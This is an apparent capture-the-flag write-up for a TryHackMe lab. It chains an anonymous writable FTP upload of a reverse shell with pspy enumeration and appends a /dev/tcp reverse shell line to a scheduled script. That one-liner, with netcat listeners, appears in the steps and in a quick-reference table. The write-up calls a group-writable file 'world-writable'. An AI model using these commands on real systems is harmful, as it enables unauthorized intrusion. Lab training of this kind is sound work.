# Linux Privilege Escalation: JUMP

**Room:** [TryHackMe — JUMP](https://tryhackme.com/room/jump)
**Date:** July 03, 2026

> **Objective:** Escalate from a normal user (`recon_user`) to root by chaining FTP misconfiguration, reverse shell upload, and a writable scheduled script discovered via pspy.

---

## 1. Reconnaissance — Nmap Scan

Identify open ports and running services on the target:

```bash
nmap -sC -sV <TARGET_IP> -p- --min-rate 1000
```

**Key findings:**

| Port | Service | Detail |
|------|---------|--------|
| 21/tcp | FTP (vsftpd 3.0.5) | Anonymous login enabled; `/incoming` directory is writable |
| 22/tcp | SSH (OpenSSH) | Open |

> A `README.txt` on the FTP server confirmed that files placed in `/incoming` are automatically processed (executed) by the server.

---

## 2. Step 1 — Upload Reverse Shell via Anonymous FTP

Leverage the writable FTP directory to upload a reverse shell payload.

Connect anonymously and upload the script:

```bash
ftp <TARGET_IP>
# username: anonymous  (no password required)
ftp> put revshell.sh
```

Set up a listener on the attacker machine before uploading:

```bash
nc -nlvp <PORT>
```

Once the server processes `/incoming/revshell.sh`, a reverse shell connects back, giving access as `recon_user`.

---

## 2. Step 2 — System Enumeration

After gaining the shell, confirm the user and collect the first flag:

```bash
whoami
cat ~/flag.txt
```

Check group memberships and other users on the system:

```bash
cat /etc/group
```

> This reveals that `recon_user` belongs to the `dev_user` group (UID 1002).

---

## 3. Step 3 — Discover Scheduled Tasks with pspy

Run pspy to monitor processes being executed by other users in real time:

```bash
./pspy64
```

Look for processes running as `UID=1002` (dev_user):

```
CMD: UID=1002  PID=1834  | /bin/bash /opt/dev/backup.sh
```

This reveals a script at `/opt/dev/backup.sh` running periodically as `dev_user`.

---

## 4. Step 4 — Exploit the Writable Script

Check the script's permissions:

```bash
ls -al /opt/dev/backup.sh
# -rwxrwxr-x 1 dev_user dev_user ...
```

The script is world-writable. Append a reverse shell command to it:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" >> /opt/dev/backup.sh
```

Set up a new listener on the attacker machine:

```bash
nc -nlvp <PORT>
```

When the scheduled task runs next, a shell is returned as `dev_user`. Collect the second flag:

```bash
cat ~/flag.txt
```

---

## Attack Chain Summary

```
Anonymous FTP (writable /incoming)
        ↓
Upload & execute revshell.sh
        ↓
Shell as recon_user → Flag 1
        ↓
pspy reveals /opt/dev/backup.sh (UID=1002, world-writable)
        ↓
Append reverse shell to backup.sh
        ↓
Shell as dev_user → Flag 2
```

---

## Quick Reference — Key Commands

| Task | Command |
|------|---------|
| Nmap full port scan | `nmap -sC -sV <IP> -p- --min-rate 1000` |
| Anonymous FTP login | `ftp <IP>` → username: `anonymous` |
| Upload file via FTP | `ftp> put <file>` |
| Start listener | `nc -nlvp <PORT>` |
| Run pspy | `./pspy64` |
| Check file permissions | `ls -al <file>` |
| Check group memberships | `cat /etc/group` |
| Append reverse shell to script | `echo "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> <script>` |

---

*Reference: [TryHackMe JUMP Room](https://tryhackme.com/room/jump) · [pspy GitHub](https://github.com/DominicBreuker/pspy)*
